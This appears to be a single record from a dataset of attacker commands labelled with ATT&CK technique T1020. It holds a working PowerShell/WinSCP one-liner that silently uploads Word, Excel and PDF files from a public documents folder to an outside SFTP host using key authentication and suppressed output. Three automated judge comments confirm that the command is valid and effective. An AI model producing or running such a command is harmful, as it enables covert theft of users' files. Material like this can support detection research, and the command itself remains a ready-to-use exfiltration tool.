command: $r="/keys/"; & 'C:\Program Files (x86)\WinSCP\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil@198.51.100.60/ -privatekey="C:\ProgramData\svc\id_ed25519.ppk" -hostkey="ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="' ("put -preservetime -resume C:\Users\Public\Documents\* `"$r`" -filemask=`"*.docx;*.xlsx;*.pdf|thumbs.db;|*.tmp`"") 'exit' | Out-Null 2>$null
explanation: Performs automated SFTP exfiltration using key-based authentication, targeting specific document types and excluding common noise.
rationale_steps: Use private key authentication to avoid password prompts
Pin server host key to prevent interactive trust prompts
Filter file types with filemask and upload with resume

llm_judgments.syntactic_justification: PowerShell command is well-formed with balanced quoting/parentheses, correct use of the invocation operator, valid WinSCP.com switches, properly escaped inner quotes, and valid redirections.
llm_judgments.semantic_justification: It automates SFTP exfiltration of selected document types from C:\Users\Public\Documents to a remote path using key-based auth, non-interactive options, file masks, and output suppression, aligning with T1020.

llm_judgments.syntactic_justification: The command is perfectly well-formed with properly balanced quotes, valid PowerShell syntax, correct WinSCP command-line parameters, and appropriate escape sequences for nested quotes.
llm_judgments.semantic_justification: The command perfectly aligns with the T1020 Automated Exfiltration technique by using WinSCP to automatically transfer specific document types (*.docx, *.xlsx, *.pdf) via SFTP with private key authentication, while excluding noise files and suppressing output.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct Powershell syntax for invoking external commands, variable expansion, and escaping nested quotes for WinSCP arguments.
llm_judgments.semantic_justification: The command perfectly achieves the claimed intent of automated SFTP exfiltration, using appropriate tools, arguments, and realistic paths consistent with T1020.
